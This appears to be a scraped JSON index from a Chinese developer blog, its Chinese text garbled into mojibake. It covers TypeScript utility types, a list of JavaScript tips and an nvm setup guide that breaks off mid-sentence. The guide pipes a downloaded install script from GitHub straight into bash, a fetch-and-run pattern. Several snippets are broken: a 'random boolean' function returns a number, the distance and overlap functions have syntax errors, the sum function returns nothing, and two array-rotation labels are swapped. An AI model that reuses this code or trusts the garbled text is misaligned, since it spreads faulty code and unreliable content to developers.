å¯ä»¥çœ‹åˆ°æœ‰ä¸€äº›å±¬æ€§æ˜¯å¯é¸çš„ï¼Œä½†æ˜¯çªç„¶æœ‰ä¸€å¤©ï¼Œæˆ‘æƒ³è®“æ‰€æœ‰å±¬æ€§è®Šæˆå¿…é¸æˆ‘æœƒå†å¯«ä¸€å€‹ interface\n1 2 3 4 5 interface IUser2 { name: string; age: number; gender: number } ä½†å¦‚æœå±¬æ€§å¤šäº†çš„è©±ï¼Œåˆè¦å¯«å¾ˆå¤šé¡å¤–çš„ä»£ç¢¼ï¼Œé€™æ™‚å€™ Required å°±æ´¾ä¸Šç”¨å ´äº†\n1 2 3 4 5 6 7 8 9 type IUser2 = Required\u0026lt;IUser1\u0026gt; // ç­‰åŒæ–¼ interface IUser2 { name: string; age: number; gender: number } åŸç† 1 2 3 type Required\u0026lt;T\u0026gt; = { [P in keyof T]-?: T[P] }; Pick ä½œç”¨ Pick å¾æŸå€‹é¡å‹ä¸­æŒ‘å‡ºä¸€äº›å±¬æ€§å‡ºä¾†\nä¾‹å­ å‡å¦‚æˆ‘ç¾åœ¨æœ‰å€‹ interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } æœ‰ä¸€å¤©æˆ‘æƒ³è¦å¯«ä¸€å€‹æ–° interfaceï¼Œå®ƒåªæ“æœ‰ ageã€gender é€™å…©å€‹å±¬æ€§ï¼Œé‚£æˆ‘æœƒé‡æ–°å¯«ä¸€å€‹ interface\n1 2 3 4 interface IUser2 { age: number; gender: number; } ä½†å…¶å¯¦ä½¿ç”¨ Pick éå¸¸æ–¹ä¾¿å»åšé€™ä»¶äº‹\n1 2 3 4 5 6 7 8 type IUser2 = Pick\u0026lt;IUser1, \u0026#39;age\u0026#39; | \u0026#39;gender\u0026#39;\u0026gt; // ç­‰åŒæ–¼ interface IUser2 { age: number; gender: number; } åŸç† 1 2 3 type Pick\u0026lt;T, K extends keyof T\u0026gt; = { [P in K]: T[P]; }; Omit ä½œç”¨ Omit\u0026lt;T, K extends keyof any\u0026gt; çš„ä½œç”¨æ˜¯ä½¿ç”¨ T é¡å‹ä¸­é™¤äº† K é¡å‹çš„æ‰€æœ‰å±¬æ€§ï¼Œä¾†æ§‹é€ ä¸€å€‹æ–°çš„é¡å‹ã€‚\nä¾‹å­ å‡å¦‚æˆ‘ç¾åœ¨æœ‰å€‹ interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } æœ‰ä¸€å¤©æˆ‘æƒ³è¦å¯«ä¸€å€‹æ–° interfaceï¼Œå®ƒåªæ“æœ‰ ageã€gender é€™å…©å€‹å±¬æ€§ï¼Œé‚£æˆ‘æœƒé‡æ–°å¯«ä¸€å€‹ interface\n1 2 3 4 interface IUser2 { age: number; gender: number; } ä½†å…¶å¯¦ä½¿ç”¨ Omit éå¸¸æ–¹ä¾¿å»åšé€™ä»¶äº‹\n1 2 3 4 5 6 7 8 type IUser2 = Omit\u0026lt;IUser1, \u0026#39;name\u0026#39;\u0026gt; // ç­‰åŒæ–¼ interface IUser2 { age: number; gender: number; } åŸç† 1 type Omit\u0026lt;T, K extends keyof any\u0026gt; = Pick\u0026lt;T, Exclude\u0026lt;keyof T, K\u0026gt;\u0026gt;; NonNullable ä½œç”¨ NonNullable çš„ä½œç”¨æ˜¯ç”¨ä¾†éæ¿¾é¡å‹ä¸­çš„ null åŠ undefined é¡å‹ã€‚\nä¾‹å­ 1 2 3 4 5 // string | number type T0 = NonNullable\u0026lt;string | number | undefined\u0026gt;; // string[] type T1 = NonNullable\u0026lt;string[] | null | undefined\u0026gt;; åŸç† 1 type NonNullable\u0026lt;T\u0026gt; = T extends null | undefined ? never : T; ReturnType ä½œç”¨ ReturnType çš„ä½œç”¨æ˜¯ç”¨ä¾†å¾—åˆ°ä¸€å€‹å‡½æ•¸çš„è¿”å›å€¼é¡å‹ã€‚\nä¾‹å­ å‡å¦‚æˆ‘æƒ³å®šç¾©ä¸€å€‹è®Šé‡ä¾†æ¥å—ä¸€å€‹å‡½æ•¸çš„è¿”å›å€¼ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€éº¼å®šç¾©é€™å€‹è®Šé‡çš„é¡å‹ï¼Œé€™å€‹æ™‚å€™å¯ä»¥ç”¨ ReturnType\n1 2 3 4 5 6 type Func = (value: number) =\u0026gt; string; let str: ReturnType\u0026lt;Func\u0026gt;; const fun: Func = (value: number) =\u0026gt; String(value) str = fun(1) åŸç† 1 2 type ReturnType\u0026lt;T extends (...args: any[]) =\u0026gt; any\u0026gt; = T extends (...args: any[]) =\u0026gt; infer R ? R : any; Exclude ä½œç”¨ Exclude\u0026lt;T, U\u0026gt; çš„ä½œç”¨æ˜¯å°‡æŸå€‹é¡å‹ä¸­å±¬æ–¼å¦ä¸€å€‹çš„é¡å‹ç§»é™¤æ‰ã€‚\nä¾‹å­ 1 2 3 4 5 type T0 = Exclude\u0026lt;\u0026#34;a\u0026#34; | \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34;\u0026gt;; // \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34; type T1 = Exclude\u0026lt;\u0026#34;a\u0026#34; | \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34; | \u0026#34;b\u0026#34;\u0026gt;; // \u0026#34;c\u0026#34; type T2 = Exclude\u0026lt;string | number | (() =\u0026gt; void), Function\u0026gt;; // string | number åŸç† 1 type Exclude\u0026lt;T, U\u0026gt; = T extends U ? never : T; Record ä½œç”¨ Record\u0026lt;K extends keyof any, T\u0026gt; çš„ä½œç”¨æ˜¯å°‡ K ä¸­æ‰€æœ‰çš„å±¬æ€§çš„å€¼è½‰åŒ–çˆ² T é¡å‹ã€‚\nä¾‹å­ 1 2 3 4 5 6 7 8 9 10 11 interface PageInfo { title: string; } type Page = \u0026#34;home\u0026#34; | \u0026#34;about\u0026#34; | \u0026#34;contact\u0026#34;; const x: Record\u0026lt;Page, PageInfo\u0026gt; = { about: { title: \u0026#34;about\u0026#34; }, contact: { title: \u0026#34;contact\u0026#34; }, home: { title: \u0026#34;home\u0026#34; }, }; åŸç† 1 2 3 type Record\u0026lt;K extends keyof any, T\u0026gt; = { [P in K]: T; }; Readonly ä½œç”¨ Readonly çš„ä½œç”¨æ˜¯å°‡æŸå€‹é¡å‹æ‰€æœ‰å±¬æ€§è®Šçˆ²åªè®€å±¬æ€§ï¼Œä¹Ÿå°±æ„å‘³ç€é€™äº›å±¬æ€§ä¸èƒ½è¢«é‡æ–°è³¦å€¼ã€‚\nä¾‹å­ 1 2 3 4 5 6 7 8 9 10 interface Todo { title: string; } const todo: Readonly\u0026lt;Todo\u0026gt; = { title: \u0026#34;Delete inactive users\u0026#34; }; todo.title = \u0026#34;Hello\u0026#34;; // Error: cannot reassign a readonly property åŸç† 1 2 3 type Readonly\u0026lt;T\u0026gt; = { readonly [P in keyof T]: T[P]; }; ","date":"2022-10-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52459954880_4228a13922_o.png","permalink":"https://wayneblog.ga/2022-10-28/ts-useful-tricks/","title":"TypeScript çš„å¯¦ç”¨æ–¹æ³•ï¼å¤§å®¶ä¸€å®šè¦å­¸æœƒå•Šï¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\næœ€è¿‘é‡æº«äº†ä¸€éç´…å¯¶æ›¸ï¼Œç™¼ç¾ä¸€äº›æ¯”è¼ƒå¥½ç©çš„å¯«æ³•ï¼Œå¾ˆå¤šæ±è¥¿æ—¥å¸¸éƒ½åœ¨ç”¨ï¼Œä½†æ˜¯ç™¼ç¾é‚„æœƒæœ‰ä¸ä¸€æ¨£çš„å¯«æ³•, çµåˆä¸€äº›æ—¥å¸¸å·¥ä½œä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œçˆ²å¤§å®¶ç¸½çµä¸€ç¯‡æ—¥å¸¸ç¶“å¸¸ä½¿ç”¨å¯èƒ½é‚„ä¸çŸ¥é“çš„é»ï¼Œå¸Œæœ›å°ä½ èƒ½æœ‰æ‰€å¹«åŠ©ã€‚\nä¸€è¡Œä»£ç¢¼å®Œæˆçµæ§‹åŠ è³¦å€¼ æˆ‘å€‘æ—¥å¸¸ç¶“å¸¸ä½¿ç”¨çµæ§‹è³¦å€¼ï¼Œä¸€èˆ¬éƒ½æ˜¯å…ˆçµæ§‹ï¼Œå†è³¦å€¼ï¼Œç•¶ç„¶æˆ‘å€‘ä¹Ÿå¯ä»¥ä¸€è¡Œå°±å®Œæˆè§£æ§‹åŠ è³¦å€¼æ“ä½œï¼Œçœ‹èµ·ä¾†éå¸¸ç°¡åŒ–ï¼Œç•¶ç„¶å¯è®€æ€§ä½ æ‡‚å¾—ï¼\n1 2 3 4 5 let people = { name: null, age: null }; let result = { name: \u0026#39;å¼µä¸‰\u0026#39;, age: 16 }; ({ name: people.name, age: people.age} = result); console.log(people) // {\u0026#34;name\u0026#34;:\u0026#34;å¼µä¸‰\u0026#34;,\u0026#34;age\u0026#34;:16} å°åŸºç¤æ•¸æ“šé¡å‹é€²è¡Œè§£æ§‹ æ—¥å¸¸ä¸­æˆ‘å€‘æ‡‰è©²ç”¨ä¸åˆ°é€™æ¨£çš„å ´æ™¯ï¼Œä½†æ˜¯å¯¦éš›ä¸Šæˆ‘å€‘ä¹Ÿå¯ä»¥å°åŸºç¤æ•¸æ“šé¡å‹è§£æ§‹ã€‚\n1 2 const {length : a} = \u0026#39;1234\u0026#39;; console.log(a) // 4 å°æ•¸çµ„è§£æ§‹å¿«é€Ÿæ‹¿åˆ°æœ€å¾Œä¸€é …å€¼ å¯¦éš›ä¸Šæˆ‘å€‘æ˜¯å¯ä»¥å°æ•¸çµ„è§£æ§‹è³¦å€¼æ‹¿åˆ° length å±¬æ€§çš„ï¼Œé€šéé€™å€‹ç‰¹æ€§ä¹Ÿå¯ä»¥åšæ›´å¤šçš„äº‹æƒ…ã€‚\n1 2 3 4 5 const arr = [1, 2, 3]; const { 0: first, length, [length - 1]: last } = arr; first; // 1 last; // 3 length; // 3 å°‡ä¸‹æ¨™è½‰çˆ²ä¸­æ–‡é›¶ä¸€äºŒä¸‰\u0026hellip; æ—¥å¸¸å¯èƒ½æœ‰çš„åˆ—è¡¨æˆ‘å€‘éœ€è¦å°‡å°æ‡‰çš„ 012345 è½‰çˆ²ä¸­æ–‡çš„ä¸€ã€äºŒã€ä¸‰ã€å››ã€äº”\u0026hellip;ï¼Œåœ¨è€çš„é …ç›®çœ‹åˆ°é‚„æœ‰é€šéè‡ªå·±æ‰‹å‹•å®šç¾©å¾ˆå¤šè¡Œé€™æ¨£çš„å¯«æ³•ï¼Œæ–¼æ˜¯å¯«äº†ä¸€å€‹é€™æ¨£çš„æ–¹æ³•è½‰æ›\n1 2 3 4 5 6 export function transfromNumber(number){ const INDEX_MAP = [\u0026#39;é›¶\u0026#39;ï¼Œ\u0026#39;ä¸€\u0026#39;.....] if(!number) return if(number === 10) return INDEX_MAP[number] return [...number.toString()].reduce( (pre, cur) =\u0026gt; pre + INDEX_MAP[cur] , \u0026#39;\u0026#39; ) } åˆ¤æ–·æ•´æ•¸çš„ä¸åŒæ–¹æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* 1. ä»»ä½•æ•´æ•¸éƒ½æœƒè¢«1æ•´é™¤ï¼Œå³é¤˜æ•¸æ˜¯0ã€‚åˆ©ç”¨é€™å€‹è¦å‰‡ä¾†åˆ¤æ–·æ˜¯å¦æ˜¯æ•´æ•¸ã€‚ä½†æ˜¯å°å­—ç¬¦ä¸²ä¸æº–ç¢º */ function isInteger(obj) { return obj % 1 === 0 } /* 1. æ·»åŠ ä¸€å€‹æ˜¯æ•¸å­—çš„åˆ¤æ–· */ function isInteger(obj) { return typeof obj === \u0026#39;number\u0026#39; \u0026amp;\u0026amp; obj % 1 === 0 } /* 2. ä½¿ç”¨Math.roundã€Math.ceilã€Math.flooråˆ¤æ–· æ•´æ•¸å–æ•´å¾Œé‚„æ˜¯ç­‰æ–¼è‡ªå·±ã€‚åˆ©ç”¨é€™å€‹ç‰¹æ€§ä¾†åˆ¤æ–·æ˜¯å¦æ˜¯æ•´æ•¸*/ function isInteger(obj) { return Math.floor(obj) === obj } /* 3. é€šéparseIntåˆ¤æ–· æŸäº›å ´æ™¯ä¸æº–ç¢º */ function isInteger(obj) { return parseInt(obj, 10) === obj } /* 4. é€šéä½é‹ç®—ç¬¦*/ function isInteger(obj) { return (obj | 0) === obj } /* 5.ES6æä¾›äº†Number.isInteger */ é€šé css æª¢æ¸¬ç³»çµ±çš„ä¸»é¡Œè‰²å¾è€Œå…¨å±€ä¿®æ”¹æ¨£å¼ @media çš„å±¬æ€§ prefers-color-scheme å°±å¯ä»¥çŸ¥é“ç•¶å‰çš„ç³»çµ±ä¸»é¡Œï¼Œç•¶ç„¶ä½¿ç”¨å‰éœ€è¦æŸ¥æŸ¥å…¼å®¹æ€§ã€‚\n1 2 @media (prefers-color-scheme: dark) { //... } @media (prefers-color-scheme: light) { //... } javascript ä¹Ÿå¯ä»¥è¼•é¬†åšåˆ°\n1 2 3 4 5 6 7 8 window.addEventListener(\u0026#39;theme-mode\u0026#39;, event =\u0026gt;{ if(event.mode == \u0026#39;dark\u0026#39;){} if(event.mode == \u0026#39;light\u0026#39;){} }) window.matchMedia(\u0026#39;(prefers-color-scheme: dark)\u0026#39;) .addEventListener(\u0026#39;change\u0026#39;, event =\u0026gt; { if (event.matches) {} // dark mode }) æ•¸çµ„éš¨æ©Ÿæ‰“äº‚é †åº é€šé 0.5-Math.random() å¾—åˆ°ä¸€å€‹éš¨æ©Ÿæ•¸ï¼Œå†é€šéå…©æ¬¡ sort æ’åºæ‰“äº‚çš„æ›´å¾¹åº•, ä½†æ˜¯é€™å€‹æ–¹æ³•å¯¦éš›ä¸Šä¸¦ä¸å¤ éš¨æ©Ÿï¼Œå¦‚æœæ˜¯ä¼æ¥­ç´šé‹ç”¨ï¼Œå»ºè­°ä½¿ç”¨ç¬¬äºŒç¨®æ´—ç‰Œç®—æ³•ã€‚\n1 2 3 function shuffle(arr) { return arr.sort(() =\u0026gt; 0.5 - Math.random()). sort(() =\u0026gt; 0.5 - Math.random()); } 1 2 3 4 5 6 7 function shuffle(arr) { for (let i = arr.length - 1; i \u0026gt; 0; i--) { const randomIndex = Math.floor(Math.random() * (i + 1)) ;[arr[i], arr[randomIndex]] = [arr[randomIndex], arr[i]] } return arr } éš¨æ©Ÿç²å–ä¸€å€‹ Boolean å€¼ å’Œä¸Šå€‹åŸç†ç›¸åŒï¼Œé€šééš¨æ©Ÿæ•¸ç²å–ï¼ŒMath.random() çš„å€é–“æ˜¯ 0-0.99ï¼Œç”¨ 0.5 åœ¨ä¸­é–“ç™¾åˆ†ä¹‹äº”åçš„æ¦‚ç‡ã€‚\n1 2 3 function randomBool() { return 0.5 - Math.random() } æŠŠæ•¸çµ„æœ€å¾Œä¸€é …ç§»åˆ°ç¬¬ä¸€é … 1 2 3 function (arr){ return arr.push(arr.shift()); } æŠŠæ•¸çµ„çš„ç¬¬ä¸€é …æ”¾åˆ°æœ€å¾Œä¸€é … 1 2 3 function(arr){ return arr.unshift(arr.pop()); } åˆ©ç”¨ set æ•¸çµ„å»é‡ 1 2 3 function uniqueArr(arr){ return [...new Set(arr)] } dom ç¯€é»å¹³æ»‘æ»¾å‹•åˆ°å¯è¦–å€åŸŸã€é ‚éƒ¨ã€åº•éƒ¨ åŸç”Ÿçš„ scrollTo æ–¹æ³•æ²’æœ‰å‹•ç•«ï¼Œé¡ä¼¼æ–¼éŒ¨é»è·³è½‰ï¼Œæ¯”è¼ƒç”Ÿç¡¬ï¼Œå¯ä»¥é€šéé€™å€‹æ–¹æ³•æœƒè‡ªå¸¶å¹³æ»‘çš„éåº¦æ•ˆæœã€‚\n1 2 3 4 5 6 7 8 9 10 function scrollTo(element) { // é ‚éƒ¨ element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;start\u0026#34; }) // åº•éƒ¨ element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;end\u0026#34; }) // å¯è¦–å€åŸŸ element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;}) } ç²å–éš¨æ©Ÿé¡è‰² æ—¥å¸¸æˆ‘å€‘ç¶“å¸¸æœƒéœ€è¦ç²å–ä¸€å€‹éš¨æ©Ÿé¡è‰²ï¼Œé€šééš¨æ©Ÿæ•¸å³å¯å®Œæˆã€‚\n1 2 3 function getRandomColor(){ return `#${Math.floor(Math.random() * 0xffffff) .toString(16)}`; } æª¢æ¸¬æ˜¯å¦çˆ²ç©ºå°è±¡ é€šéä½¿ç”¨ ES6 çš„ Reflect éœæ…‹æ–¹æ³•åˆ¤æ–·ä»–çš„é•·åº¦å°±å¯ä»¥åˆ¤æ–·æ˜¯å¦æ˜¯ç©ºæ•¸çµ„äº†ï¼Œä¹Ÿå¯ä»¥é€šé Object.keys() ä¾†åˆ¤æ–·ã€‚\n1 2 3 function isEmpty(obj){ return Reflect.ownKeys(obj).length === 0 \u0026amp;\u0026amp; obj.constructor === Object; } Boolean è½‰æ› ä¸€äº›å ´æ™¯ä¸‹æˆ‘å€‘æœƒå°‡ boolean å€¼å®šç¾©çˆ²å ´æ™¯ï¼Œä½†æ˜¯åœ¨ js ä¸­éç©ºçš„å­—ç¬¦ä¸²éƒ½æœƒè¢«èªçˆ²æ˜¯ trueã€‚\n1 2 3 4 5 6 7 function toBoolean(value, truthyValues = [\u0026#39;true\u0026#39;]){ const normalizedValue = String(value).toLowerCase().trim(); return truthyValues.includes(normalizedValue); } toBoolean(\u0026#39;TRUE\u0026#39;); // true toBoolean(\u0026#39;FALSE\u0026#39;); // false toBoolean(\u0026#39;YES\u0026#39;, [\u0026#39;yes\u0026#39;]); // true å„ç¨®æ•¸çµ„è¤‡è£½æ–¹æ³• æ•¸çµ„å…‹éš†çš„æ–¹æ³•å…¶å¯¦ç‰¹åˆ¥å¤šäº†ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰ä½ æ²’è¦‹éçš„ï¼\n1 2 3 4 5 6 7 const clone = (arr) =\u0026gt; arr.slice(0); const clone = (arr) =\u0026gt; [...arr]; const clone = (arr) =\u0026gt; Array.from(arr); const clone = (arr) =\u0026gt; arr.map((x) =\u0026gt; x); const clone = (arr) =\u0026gt; JSON.parse(JSON.stringify(arr)); const clone = (arr) =\u0026gt; arr.concat([]); const clone = (arr) =\u0026gt; structuredClone(arr); æ¯”è¼ƒå…©å€‹æ™‚é–“å¤§å° é€šéèª¿ç”¨ getTime ç²å–æ™‚é–“æˆ³æ¯”è¼ƒå°±å¯ä»¥äº†ã€‚\n1 2 3 function compare(a, b){ return a.getTime() \u0026gt; b.getTime(); } è¨ˆç®—å…©å€‹æ™‚é–“ä¹‹é–“çš„æœˆä»½å·®ç•° 1 2 3 function monthDiff(startDate, endDate){ return Math.max(0, (endDate.getFullYear() - startDate.getFullYear()) * 12 - startDate.getMonth() + endDate.getMonth()); } ä¸€æ­¥é©Ÿå¾æ™‚é–“ä¸­æå–å¹´æœˆæ—¥æ™‚åˆ†ç§’ æ™‚é–“æ ¼å¼åŒ–è¼•é¬†è§£æ±ºï¼Œä¸€æ­¥é©Ÿç²å–åˆ°å¹´æœˆæ—¥æ™‚åˆ†ç§’æ¯«ç§’ï¼Œç”±æ–¼ toISOString æœƒä¸Ÿå¤±æ™‚å€ï¼Œå°è‡´æ™‚é–“å·®å…«å°æ™‚ï¼Œæ‰€ä»¥åœ¨æ ¼å¼åŒ–ä¹‹å‰æˆ‘å€‘åŠ ä¸Šå…«å€‹å°æ™‚æ™‚é–“å³å¯ã€‚\n1 2 3 4 5 6 function extract(date){ const d = new Date(new Date(date).getTime() + 8*3600*1000); return new Date(d).toISOString().split(/[^0-9]/).slice(0, -1); } console.log(extract(new Date())) // [\u0026#39;2022\u0026#39;, \u0026#39;09\u0026#39;, \u0026#39;19\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;06\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;187\u0026#39;] åˆ¤æ–·ä¸€å€‹åƒæ•¸æ˜¯ä¸æ˜¯å‡½æ•¸ æœ‰æ™‚å€™æˆ‘å€‘çš„æ–¹æ³•éœ€è¦å‚³å…¥ä¸€å€‹å‡½æ•¸å›èª¿ï¼Œä½†æ˜¯éœ€è¦æª¢æ¸¬å…¶é¡å‹ï¼Œæˆ‘å€‘å¯ä»¥é€šé Object çš„åŸå‹æ–¹æ³•å»æª¢æ¸¬ï¼Œç•¶ç„¶é€™å€‹æ–¹æ³•å¯ä»¥æº–ç¢ºæª¢æ¸¬ä»»ä½•é¡å‹ã€‚\n1 2 3 function isFunction(v){ return [\u0026#39;[object Function]\u0026#39;, \u0026#39;[object GeneratorFunction]\u0026#39;, \u0026#39;[object AsyncFunction]\u0026#39;, \u0026#39;[object Promise]\u0026#39;].includes(Object.prototype.toString.call(v)); } è¨ˆç®—å…©å€‹åº§æ¨™ä¹‹é–“çš„è·é›¢ 1 2 3 function distance(p1, p2){ return `Math.sqrt(Math.pow(p2.x - p1.x, 2) + Math.pow(p2.y - p1.y, 2)); } æª¢æ¸¬å…©å€‹ dom ç¯€é»æ˜¯å¦è¦†è“‹é‡ç–Š æœ‰äº›å ´æ™¯ä¸‹æˆ‘å€‘éœ€è¦åˆ¤æ–· dom æ˜¯å¦ç™¼ç”Ÿç¢°æ’äº†æˆ–è€…é‡ç–Šäº†ï¼Œæˆ‘å€‘å¯ä»¥é€šé getBoundingClientRect ç²å–åˆ° dom çš„ x1ã€y1ã€x2ã€y2 åº§æ¨™ç„¶å¾Œé€²è¡Œåº§æ¨™æ¯”å°å³å¯åˆ¤æ–·å‡ºä¾†ã€‚\n1 2 3 function overlaps = (a, b) { return (a.x1 \u0026lt; b.x2 \u0026amp;\u0026amp; b.x1 \u0026lt; a.x2) || (a.y1 \u0026lt; b.y2 \u0026amp;\u0026amp; b.y1 \u0026lt; a.y2); } åˆ¤æ–·æ˜¯å¦æ˜¯ Nodejs ç’°å¢ƒ å‰ç«¯çš„æ—¥å¸¸é–‹ç™¼æ˜¯é›¢ä¸é–‹ nodejs çš„ï¼Œé€šéåˆ¤æ–·å…¨å±€ç’°å¢ƒä¾†æª¢æ¸¬æ˜¯å¦æ˜¯ nodejs ç’°å¢ƒã€‚\n1 2 3 function isNode(){ return typeof process !== \u0026#39;undefined\u0026#39; \u0026amp;\u0026amp; process.versions != null \u0026amp;\u0026amp; process.versions.node != null; } åƒæ•¸æ±‚å’Œ ä¹‹å‰çœ‹åˆ°æœ‰é€šéå‡½æ•¸æŸ¯ç†åŒ–å½¢å¼ä¾†æ±‚å’Œçš„ï¼Œé€šé reduce ä¸€è¡Œå³å¯ã€‚\n1 2 3 function sum(...args){ args.reduce((a, b) =\u0026gt; a + b); } ","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52457807569_15f64548d9_o.jpg","permalink":"https://wayneblog.ga/2022-10-27/js-30-keypoints/","title":"30 å€‹ Javascript çŸ¥è­˜é»ç¸½çµï¼Œç¸½æœ‰ä½ ä¸æœƒçš„ï¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nnvm æ˜¯ Node.js çš„ç‰ˆæœ¬ç®¡ç†å™¨ (version manager)ï¼Œå¯åœ¨åŒä¸€å°ä¸»æ©Ÿä¸Šå®‰è£å¤šå€‹ç‰ˆæœ¬çš„ Node.js ç’°å¢ƒï¼Œå› ç‚ºä¸åŒå°ˆæ¡ˆå¯èƒ½æœƒä½¿ç”¨ä¸åŒçš„ Node.js ç‰ˆæœ¬ï¼Œé‚£å°±éœ€è¦é€éä¸€å€‹ç‰ˆæœ¬ç®¡ç†å™¨ä¾†åˆ‡æ›ä¸åŒçš„ Node.js ç‰ˆæœ¬ã€‚\nå®‰è£ NVM æ¥ä¸‹ä¾†åˆ° NVM çš„ GitHub å„²å­˜åº«ä¸‹è¼‰ï¼Œç„¡è«–ä½ æ˜¯ Windowsã€MacOSã€Unix ç³»çµ±éƒ½æœ‰å°æ‡‰çš„å®‰è£æ–¹å¼ã€‚\nWindows NVM for Windows æœ‰æä¾›å®‰è£å·¥å…·ï¼Œä¸‹è¼‰å¾Œç…§è‘—å®‰è£ç²¾éˆä¾åºå®Œæˆå³å¯é‹ä½œï¼Œä¸‹è¼‰é€£çµã€‚\nè«‹é¸æ“‡ nvm-setup ä¸‹è¼‰ä¸¦å®‰è£\nä¸‹è¼‰å¾Œä¾å¾ªè‘—å®‰è£ç²¾éˆå³å¯å®Œæˆã€‚\nå®Œæˆå¾Œï¼Œæ‰“é–‹ã€Œå‘½ä»¤æç¤ºå­—å…ƒã€å¯ä»¥è©¦è‘—è¼¸å…¥ nvmï¼Œå¦‚æœçœ‹åˆ°é¡ä¼¼ä»¥ä¸‹ç•«é¢å°±ç®—æ˜¯å®Œæˆäº†ã€‚\nMacOS MacOS å‰‡æ˜¯ä½¿ç”¨æŒ‡ä»¤é€²è¡Œå®‰è£ï¼Œæ‰“é–‹ã€Œçµ‚ç«¯æ©Ÿã€æˆ–è‡ªè¡Œå®‰è£çš„ã€ŒiTermã€ç­‰å·¥å…·ï¼Œè¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤å³å¯é–‹å§‹å®‰è£ï¼Œï¼ˆæ›´å¤šç‰ˆæœ¬é€£çµï¼‰ã€‚\n1 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash å®‰è£å¾Œé æœŸæœƒé¡¯ç¤ºä»¥ä¸‹ç‰‡æ®µåŠç®—å®‰è£å®Œæˆï¼Œè€Œæ­¤æ™‚å¦‚æœä½ æœ‰å®‰è£å…¶å®ƒæŒ‡ä»¤å·¥å…·ï¼Œæœ‰å¯èƒ½æœƒç™¼ç”Ÿè¼¸å…¥ nvm ç„¡æ³•å‘¼å«çš„ç‹€æ³ï¼ˆä¾‹å¦‚ï¼šzsh: command not found: nvmï¼‰ã€‚\næ¥ä¸‹ä¾†å¯ä»¥åœ¨ä½ æ‰€ä½¿ç”¨çš„å‘½ä»¤è¨­å®šæª”æ¡ˆåŠ å…¥ä»¥ä¸‹ç‰‡æ®µç¨‹å¼ç¢¼ï¼Œä»¥ä¸‹æä¾› bashã€zsh çš„èªªæ˜ï¼Œå…©è€…ä¾æ“šç’°å¢ƒé¸æ“‡å…¶ä¸€å³å¯ï¼š\nbash(é è¨­) zsh bash é è¨­çš„æƒ…æ³ä¸‹ï¼ŒMacOS ä¸­å¯èƒ½æ²’æœ‰ä»»ä½•ä¸€å€‹æŒ‡ä»¤è¨­å®šæª”æ¡ˆï¼Œæ­¤æ™‚å¯ä»¥ä½¿ç”¨ touch ~/.bash_profile æ–°å¢ä¸€å€‹æ–‡å­—æª”æ¡ˆåœ¨æ ¹ç›®éŒ„ä¸Šï¼Œæ¥ä¸‹ä¾†å›åˆ°è³‡æ–™æ ¹ç›®éŒ„å¯ä»¥æ‰¾åˆ° .bash_profileï¼Œæ²’çœ‹åˆ°çš„è©±ä»£è¡¨æœªé–‹å•Ÿéš±è—æª”æ¡ˆé¡¯ç¤ºï¼Œå¯ä»¥æŒ‰ä¸‹ Command + Shift+ . é¡¯ç¤ºã€‚\næ¥ä¸‹ä¾†ä½¿ç”¨ä»»ä½•æ–‡å­—ç·¨è¼¯å™¨æ‰“é–‹è©²æª”æ¡ˆï¼Œä¸¦åŠ å…¥ä»¥ä¸‹ç¨‹å¼ç¢¼å­˜æª”å³å¯ã€‚\n1 2 3 export NVM_DIR=\u0026#34;$HOME/.nvm\u0026#34; [ -s \u0026#34;$NVM_DIR/nvm.sh\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/nvm.sh\u0026#34; # This loads nvm [ -s \u0026#34;$NVM_DIR/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/bash_completion\u0026#34; # This loads nvm bash_completion zsh å¯ä»¥æ‰“é–‹ .zshrc åŠ å…¥ä»¥ä¸‹ç‰‡æ®µå¾Œé‡å•Ÿï¼ˆæ³¨æ„ï¼š.zshrc é€šå¸¸åœ¨ä½¿ç”¨è€…æ ¹ç›®éŒ„ä¸‹ä¸¦ä¸”ç‚ºéš±è—æª”ï¼Œæ‰¾åˆ°å¾Œä½¿ç”¨ä»»ä½•æ–‡å­—ç·¨è¼¯å™¨æ‰“é–‹ç·¨è¼¯ï¼‰ã€‚\n1 2 3 export NVM_DIR=\u0026#34;$HOME/.nvm\u0026#34; [ -s \u0026#34;$NVM_DIR/nvm.sh\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/nvm.sh\u0026#34; # This loads nvm [ -s \u0026#34;$NVM_DIR/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/bash_completion\u0026#34; # This loads nvm bash_completion è¨­å®šå®Œæˆä»¥å¾Œï¼ŒæŒ‰ä¸‹ nvm å°±æœƒè·³å‡ºå¦‚ä¸‹åœ–å°±ç®—å®Œæˆäº†ã€‚\næ³¨æ„ï¼š\nä½¿ç”¨ nvm æ™‚ï¼Œä¸éœ€è¦ sudo å³å¯ä½¿ç”¨ npm -g å…¨åŸŸå®‰è£æ¨¡çµ„ï¼Œæ‰€ä»¥èˆ‡å…¶åŸ·è¡Œ sudo npm i -gï¼Œä¸å¦‚åŸ·è¡Œ npm i -g è‹¥ä½ æœ‰ 